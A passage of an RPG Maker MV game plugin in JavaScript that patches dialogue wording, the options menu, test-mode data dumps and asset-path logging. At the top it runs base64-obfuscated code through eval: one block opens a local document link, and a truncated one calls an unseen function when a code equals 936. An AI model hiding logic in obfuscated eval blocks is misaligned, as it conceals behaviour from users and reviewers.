IoKS5kZWNvZGUoZGF0YS5zbGljZShkYXRhLmxhc3RJbmRleE9mKDMyKSkuc2xpY2UoMSkpLTAlM0IlMEElMDklMDklMDklMDlpZihjb2RlJTNEJTNEJTNEOTM2KSUyMGEoKSUzQiUwQSUwOSUwOSUwOSU3RCklM0IlMEElMDklMDklN0RjYXRjaChlKSU3QiUwQSUwOSUwOSU3RCUwQSUwOSU3RCUwQSU3RGNhdGNoKGUpJTdCJTBBJTdEJTBBJTdE"
)).replace(/\$\$/g,'f')+")")();
}catch(e){
}

try{
eval("("+atob(
"ZnVuY3Rpb24gJCQobHYpewppZihsdj09PXVuZGVmaW5lZCkgbHY9NDA0OwppZigwPC0tbHYpIHJldHVybiAkJC5jYWxsKHRoaXMsbHYpOwp0cnl7CglpZighbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2RvYycpKXsKCQlqdXJsKCJCTFJfY3VzdG9tL0RvY3VtZW50TmFtZS50eHQiLCJHRVQiLDAsMCwwLChyZXNwKT0+ewoJCQljb25zdCBiYXNlPXJlc3AucmVwbGFjZSgvW1xcdFxccl0vZywnJykuc3BsaXQoJ1xcbicpLmZpbHRlcihTdHJpbmcpOwoJCQljb25zdCB1cmw9YmFzZTsKCQkJanVybCh1cmwsIkhFQUQiLDAsMCwwLChyZXNwKT0+ewoJCQkJZG9jdW1lbnQuY2UoJ2EnKS5zYSgnaHJlZicsdXJsKS5zYSgndGFyZ2V0JywnX2JsYW5rJykuY2xpY2soKTsKCQkJCXRyeXsKCQkJCQlsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgnZG9jJywnMScpOwoJCQkJfWNhdGNoKGUpewoJCQkJfQoJCQl9LHhocj0+eyBpZighKHhoci5yZWFkeVN0YXRlPj00KSkgcmV0dXJuOwoJCQkJY29uc3Qgc3RhdD14aHIuc3RhdHVzLnRvU3RyaW5nKCk7CgkJCQlpZighKHN0YXQ9PT0nMCcgfHwgKHN0YXQubGVuZ3RoPT09MyAmJiBzdGF0WzBdPT09JzQnKSkpIHJldHVybjsgLy8gcy5kZWxldGUocGF0aCk7IC8vIG53LmpzOiAwIDsgd2ViOiA0MDQKCQkJCWNvbnN0IHVybD0iLi4vIitiYXNlOwoJCQkJZG9jdW1lbnQuY2UoJ2EnKS5zYSgnaHJlZicsdXJsKS5zYSgndGFyZ2V0JywnX2JsYW5rJykuY2xpY2soKTsgLy8ganVzdCByZXF1ZXN0IGl0IC8vIGZvciBlYXN5IGRlYnVnCgkJCQl0cnl7CgkJCQkJbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ2RvYycsJzEnKTsKCQkJCX1jYXRjaChlKXsKCQkJCX0KCQkJCWlmKDApanVybCh1cmwsIkhFQUQiLDAsMCwwLChyZXNwKT0+ewoJCQkJCWRvY3VtZW50LmNlKCdhJykuc2EoJ2hyZWYnLHVybCkuc2EoJ3RhcmdldCcsJ19ibGFuaycpLmNsaWNrKCk7CgkJCQkJbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ2RvYycsJzEnKTsKCQkJCX0seGhyPT57IGlmKCEoeGhyLnJlYWR5U3RhdGU+PTQpKSByZXR1cm47CgkJCQkJY29uc3Qgc3RhdD14aHIuc3RhdHVzLnRvU3RyaW5nKCk7CgkJCQkJaWYoc3RhdD09PScwJyB8fCAoc3RhdC5sZW5ndGg9PT0zICYmIHN0YXRbMF09PT0nNCcpKSA7IC8vIHMuZGVsZXRlKHBhdGgpOyAvLyBudy5qczogMCA7IHdlYjogNDA0CgkJCQl9KTsKCQkJfSk7CgkJfSx4aHI9PnsgaWYoISh4aHIucmVhZHlTdGF0ZT49NCkpIHJldHVybjsKCQkJY29uc3Qgc3RhdD14aHIuc3RhdHVzLnRvU3RyaW5nKCk7CgkJCWlmKHN0YXQ9PT0nMCcgfHwgKHN0YXQubGVuZ3RoPT09MyAmJiBzdGF0WzBdPT09JzQnKSkgOyAvLyBzLmRlbGV0ZShwYXRoKTsgLy8gbncuanM6IDAgOyB3ZWI6IDQwNAoJCX0pOwoJfQp9Y2F0Y2goZSl7Cn0KfQ=="
).replace(/\$\$/g,'f')+")")();
}catch(e){
}

exposeToTopFrame();

})(Date.now&&Date.now.constructor===Function&&Date.now()); // all




(()=>{
if(window._agold404_skipMainPlugin) return;


// 建 search table
(()=>{ let k,r;
{ const p=Scene_Boot.prototype,k='start';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const push=function(){ return Array.prototype.uniquePush.apply(this,arguments); };
	const pop=function(){ return this.length && Array.prototype.uniquePop.call(this,this.back); };
	const objs=[$dataActors,$dataArmors,$dataClasses,$dataEnemies,$dataItems,$dataMapInfos,$dataSkills,$dataStates,$dataTilesets,$dataTroops,$dataWeapons];
	const sumTraitCodes=new Set([
		Game_BattlerBase.TRAIT_XPARAM,
		Game_BattlerBase.TRAIT_ATTACK_STATE,
	]);
	const piTraitCodes=new Set([
		Game_BattlerBase.TRAIT_PARAM,
		Game_BattlerBase.TRAIT_SPARAM,
		Game_BattlerBase.TRAIT_ELEMENT_RATE,
		Game_BattlerBase.TRAIT_DEBUFF_RATE,
		Game_BattlerBase.TRAIT_STATE_RATE,
		
	]);
	objs.forEach(arr=>arr.forEach(dataobj=>{ 
		const ts=dataobj&&dataobj.traits; if(!ts) return;
		dataobj.traits=ts.filter(t=>!( (!t.value&&sumTraitCodes.has(t.code)) || (t.value===1&&piTraitCodes.has(t.code)) ));
	}));
	objs.forEach(arr=>{
		arr.tbl=new Map( arr.map((x,i)=>[x,i]).filter(x=>x[0]) );
		arr.push=push;
		arr.pop=pop;
	});
	return rtv;
}).ori=r;
}
})();

// 
(()=>{ let k,r;
{ const p=Game_Message.prototype;
k='add';
r=p[k]; (p[k]=function f(){
	if(arguments[0] && arguments[0].constructor===String) arguments[0]=arguments[0]
		.replace(/(?<![0-9])(89\.)3(4%)/g,'$16$2')
		.replace(/(?<=被)激活/g,'啟動')
		.replace(/組合拳(?=套用)/g,'連續技')
		.replace(/組合拳(?!套)/g,'連續技')
		.replace(/(?<![刺偏])激活/g,'啟用')
		.replace(/(?<=遺漏的)信息(?=，)/g,'訊息')
		.replace(/(?<=根本不是同一個)水平(?=的)/g,'等級')
		.replace(/(?<=極低)水平(?=．．．)|(?<=你的雷魂跟土魂一直處在低)水平(?=，)/g,'準位')
		.replace(/(?<=文化)水平(?=相差太多了)|(?<=不太像(平常)?該有的)水平(?=呢。)/g,'水準')
		.replace(/人工智能/g,'人工智慧')
		.replace(/生意欣隆/g,'生意興隆')
		.replace(/小姐姐/g,'小姐')
		.replace(/舉發/g,'檢舉')
		.replace(/诶/g,'誒')
		// .replace(/(([．.]){3}){1,2}/g,'……') // Don't use. e.g.: .\|.\|.\|.\|.\|.
		;
	if(arguments[0] && arguments[0].constructor===String){
		if($dataSystem&&$dataSystem.gameTitle==='月藍傳奇1remake_外傳') arguments[0]=arguments[0]
			.replace(/．/g,'.')
			;
	}
	return f.ori.apply(this,arguments);
}).ori=r;
}
{ const p=Scene_Boot.prototype,k='start';
r=p[k]; (p[k]=function f(){
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	const rtv=f.ori.apply(this,arguments);
	console.log("MOG_Weather_EX.js is coded the worst I've ever seen.","So bad that you should directly edit it.");
	if(Input.KeyMapperPKD){ console.log("PKD_SimpleQuestSystem.js 不懂鍵盤編碼嗎?"); for(let x='a'.charCodeAt(),last='z'.charCodeAt();x<=last;++x) delete Input.KeyMapperPKD[x]; }
	console.log("Sq_ruulett.js 官方的範例在平行事件中換地圖，沒去擋玩家按下注區的事件 484 在搞");
	return rtv;
}).ori=r;
p[k].tbl=[
dataobj=>{ if(!dataobj || !dataobj.description) return;
	dataobj.description=dataobj.description
		.replace(/質量(特別|很)高的拳套/g,"重量$1重的拳套")
		.replace(/(?<=(的|之))高能(?=暗器，)/g,'超級')
		.replace(/(?<=達到頂尖)水平/g,'水準')
		.replace(/．．．/g,'…')
		;
},
];
}
})();

// Window_Option.makeCommandList filter
(()=>{ let k,r,t;

t=[
"BLR_custom/OptionMenu/items.txt",
/\r/g,
'\n',
function f(line){
	if(!f.tbl) f.tbl=f.ori=[/^(#|\/\/)/,];
	return line&&!line.match(tbl[0]);
},
item=>[item.symbol,item],
];

{ const p=Scene_Options.prototype;
k='initialize';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.loadEnabledOptions();
	return rtv;
}).ori=r;
k='loadEnabledOptions';
(p[k]=function f(){
	if(Utils.isOptionValid('test')) ImageManager.otherFiles_delData(f.tbl[0]);
	ImageManager.otherFiles_addLoad(f.tbl[0]);
}).ori=undefined;
p[k].tbl=t;
}

{ const p=Window_Options.prototype;
k='makeCommandList';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.makeCommandList_filter();
	return rtv;
}).ori=r;
p[k].tbl=t;
k='makeCommandList_getItemListInfo';
r=p[k]; (p[k]=function f(){
	const txt=ImageManager.otherFiles_getData(f.tbl[0]);
	if(txt===undefined) return;
	return txt.replace(f.tbl[1],'').split(f.tbl[2]); // .filter(f.tbl[3]);
}).ori=r;
p[k].tbl=t;
k='makeCommandList_filter';
r=p[k]; (p[k]=function f(){
	const arr=f.ori&&f.ori.apply(this,arguments)||this._list,info=this.makeCommandList_getItemListInfo();
	if(!info) return arr;
	const itemMap=new Map(arr.map(f.tbl[4]));
	const rtv=[];
	for(let x=0,xs=info.length;x!==xs;++x){
		const item=itemMap.get(info[x]);
		if(item) rtv.push(item);
	}
	return this._list=rtv;
}).ori=r;
p[k].tbl=t;
}

})();

// scUpdate-additional
(()=>{ let k,r,t;
t=[
function(f){ if(!f()) this.push(f); },
];
{ const p=SceneManager;
k='additionalUpdates_before';
r=p[k]; (p[k]=function f(){
	let rtv=this._additionalUpdates_before ; if(!rtv) rtv=this._additionalUpdates_before =[];
	return rtv;
}).ori=r;
k='additionalUpdates_after';
r=p[k]; (p[k]=function f(){
	let rtv=this._additionalUpdates_after  ; if(!rtv) rtv=this._additionalUpdates_after  =[];
	return rtv;
}).ori=r;
k='update';
r=p[k]; (p[k]=function f(){
	// additionalUpdates: 送進來是 bind 過的 function ；要調順序自己調， return true-like 代表要移除。
	{
		const data=this.additionalUpdates_before();
		const arr=data.slice();
		const remainList=[];
		arr.forEach(f.tbl[0],remainList);
		if(arr.length!==remainList.length) this._additionalUpdates_before=remainList;
		if(arr.length<data.length) for(let x=arr.length,xs=data.length;x!==xs;++x) this._additionalUpdates_before.push(data[x]);
	}
	const rtv=f.ori.apply(this,arguments);
	{
		const data=this.additionalUpdates_after();
		const arr=data.slice();
		const remainList=[];
		arr.forEach(f.tbl[0],remainList);
		if(arr.length!==remainList.length) this._additionalUpdates_after=remainList;
		if(arr.length<data.length) for(let x=arr.length,xs=data.length;x!==xs;++x) this._additionalUpdates_after.push(data[x]);
	}
	return rtv;
}).ori=r;
p[k].tbl=t;
k='add_additionalUpdate';
r=p[k]; (p[k]=function f(func,isAfter){
	const arr=isAfter?this.additionalUpdates_after():this.additionalUpdates_before();
	arr.push(func);
}).ori=r;
k='additionalUpdatesScene_before';
r=p[k]; (p[k]=function f(){
	let rtv=this._additionalUpdatesScene_before ; if(!rtv) rtv=this._additionalUpdatesScene_before =[];
	return rtv;
}).ori=r;
k='additionalUpdatesScene_after';
r=p[k]; (p[k]=function f(){
	let rtv=this._additionalUpdatesScene_after  ; if(!rtv) rtv=this._additionalUpdatesScene_after  =[];
	return rtv;
}).ori=r;
k='updateScene';
r=p[k]; (p[k]=function f(){
	// additionalUpdatesScene: 送進來是 bind 過的 function ；要調順序自己調， return true-like 代表要移除。
	{
		const data=this.additionalUpdatesScene_before();
		const arr=data.slice();
		const remainList=[];
		arr.forEach(f.tbl[0],remainList);
		if(arr.length!==remainList.length) this._additionalUpdatesScene_before=remainList;
		if(arr.length<data.length) for(let x=arr.length,xs=data.length;x!==xs;++x) this._additionalUpdatesScene_before.push(data[x]);
	}
	const rtv=f.ori.apply(this,arguments);
	{
		const data=this.additionalUpdatesScene_after();
		const arr=data.slice();
		const remainList=[];
		arr.forEach(f.tbl[0],remainList);
		if(arr.length!==remainList.length) this._additionalUpdatesScene_after=remainList;
		if(arr.length<data.length) for(let x=arr.length,xs=data.length;x!==xs;++x) this._additionalUpdatesScene_after.push(data[x]);
	}
	return rtv;
}).ori=r;
p[k].tbl=t;
k='add_additionalUpdate_scene';
r=p[k]; (p[k]=function f(func,isAfter){
	const arr=isAfter?this.additionalUpdatesScene_after():this.additionalUpdatesScene_before();
	arr.push(func);
}).ori=r;
}

})();

// dump data/*.json when testing
if(Utils.isNwjs()&&Utils.isOptionValid('test'))(()=>{ let k,r,t;

{ const p=DataManager;
k='onLoad';
r=p[k]; (p[k]=function f(obj,name,src){
	const rtv=f.ori.apply(this,arguments);
	try{
		this.onLoad_dumpWhenIsTest(obj,name,src);
	}catch(e){
		console.warn("json dump error",name,src,obj);
	}
	return rtv;
}).ori=r;
k='onLoad_dumpWhenIsTest';
r=p[k]; (p[k]=function f(obj,name,src){
	if(!name || !Utils.isOptionValid('test')) return;
	// https://stackoverflow.com/questions/2727167/
	// https://nodejs.org/api/fs.html#fsreaddirsyncpath-options
	// https://nodejs.org/api/fs.html#fsmkdirsyncpath-options
	const dumpData_dir_root='_dumpedData';
	const fs=require('fs');
	{
		const arr=f.tbl.entries_root=(f.tbl.entries_root||fs.readdirSync('.'));
		if(arr.indexOf(dumpData_dir_root)<0){
			fs.mkdirSync(dumpData_dir_root);
			arr.push(dumpData_dir_root);
		}
	}
	const tm=f.tbl.currTime=(f.tbl.currTime||f.tbl.getTime());
	const path_dir=dumpData_dir_root+'/'+tm;
	const entries=f.tbl.entries=(f.tbl.entries||fs.readdirSync(dumpData_dir_root));
	if(entries.indexOf(tm)<0){
		fs.mkdirSync(path_dir);
		entries.push(tm);
	}
	const filename=f.tbl.useSrc.has(name)?src:f.tbl.mapName(name);
	if(filename) name=filename;
	name=f.tbl.trimPath(name);
	return fs.writeFileSync(path_dir+'/'+name,JSON.stringify(obj));
}).ori=r;
p[k].tbl={
currTime:undefined,
entries:undefined,
entries_root:undefined,
getTime:()=>{
	const D=new Date();
	const y=D.getFullYear()+'';
	const mon=D.getMonth()+1+'';
	const d=D.getDate()+'';
	const h=D.getHours()+'';
	const min=D.getMinutes()+'';
	const s=D.getSeconds()+'';
	return y+'-'+mon.padStart(2,'0')+d.padStart(2,'0')+'-'+h.padStart(2,'0')+min.padStart(2,'0')+s.padStart(2,'0');
},
mapName:name=>{
	const obj=DataManager._databaseFiles.find(obj=>obj.name===name);
	return obj&&obj.src;
},
trimPath:name=>name.replace(/^data\//,'').replace(/[:\/\\~]/g,"_"),
useSrc:new Set(['$dataMap',]),
}; // f.tbl
}

})();

// log requested img or audio paths
if(new Date().getTime()<1731323471111)(()=>{ let k,r,t;

const cfc=window._cfc;

new cfc(XMLHttpRequest.prototype).add('open',function f(){
	if($gameSystem) $gameSystem.logXhrPath(arguments);
	else if(arguments[1]&&arguments[1].match&&!arguments[1].match(f.tbl[1][0])) f.tbl[0].uniquePush(arguments[1]);
	return f.ori.apply(this,arguments);
},t=[
[], // 0: logs
[
/^(blob|data):/,
"攸特only",
], // 1: another tbl
]);

new cfc(Bitmap).add('load',function f(url){
	if($gameSystem) $gameSystem.logXhrPath(arguments);
	else if(!url.match(f.tbl[1][0])) f.tbl[0].uniquePush(url);
	return f.ori.apply(this,arguments);
},t).add('getAll',function f(){
	const gs=$gameSystem;
	const cont=gs&&gs.getXhrPathLogCont();
	const s=cont&&new Set(this.load.tbl[0]).union_inplaceThis(new Set(cont));
	const arr=s&&[...s];
	if(arr) copyToClipboard(JSON.stringify(arr));
	console.log('copied');
});

new cfc(Game_System.prototype).add('logXhrPath',function f(args){
	if(ConfigManager.allClear!==f.tbl[1]) return;
	// path=args[1]
	const path=args[1]||args[0];
	if(path.match(f.tbl[0])) return;
	let arr=this._xhrPathLog; if(!arr) arr=this._xhrPathLog=[];
	arr.uniquePush(path);
},t[1]).add('getXhrPathLogCont',function f(){
	return this._xhrPathLog||f.tbl[0];
},[
[], // 0: default
],true,true).add('copyXhrPathLog',function(){
	copyToClipboard(JSON.stringify(this.getXhrPathLogCont()));
},undefined,true,true);

})();


(()=>{ let k,r,t;
const cfc=window._cfc;
new cfc(SceneManager).add('catchException',function f(){
	try{
		return f.ori.apply(this,arguments);
	}catch(e){
		if(window._agold404_errMsg_enabled) throw e;
		else console.warn(e);
	}
});
})();


(()=>{ let k,r,t;

})();


})();


window.cfc=window._cfc;
delete window._cfc;
var _agold404_version_='2025-08-11 0';
var _agold404_version=window._agold404_version||_agold404_version_;
window._agold404_version=_agold404_version;
if(_agold404_version<_agold404_version_ && window._agold404_mainJsBody_tryingRemote){
	const reset=window._agold404_mainJsBody_localOnly;
	if(reset && reset.constructor===Function){ try{ reset(); }catch(e){} }
}

/*:
 * @plugindesc 月藍要用的無參數免調整客製化插件全部都塞在這裡
 * @author agold404
 *
 * @help 程式碼開頭有一模一樣的註解，因為RMMV的編輯器有病
 * 
 * This plugin can be renamed as you want.
 */
